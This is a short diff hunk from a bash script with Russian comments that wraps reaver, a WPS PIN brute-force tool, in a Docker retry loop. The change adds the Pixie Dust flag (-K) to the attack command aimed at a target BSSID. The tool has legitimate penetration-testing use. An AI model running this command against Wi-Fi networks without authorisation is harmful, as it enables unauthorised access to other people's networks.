@@ -63,7 +63,7 @@ echo "Timeout:   $TIMEOUT seconds" >&2
 echo "Log:       $LOG_FILE" >&2
 
 # Команда reaver
-REAVER_CMD="reaver -i $INTERFACE -b $BSSID -F -w -N -d 2 -l 5 -t 20"
+REAVER_CMD="reaver -i $INTERFACE -b $BSSID -F -w -N -d 2 -l 5 -t 20 -K"
 
 # Bash-скрипт внутри Docker: цикл попыток до timeout или нахождения PIN
 INNER_SCRIPT="
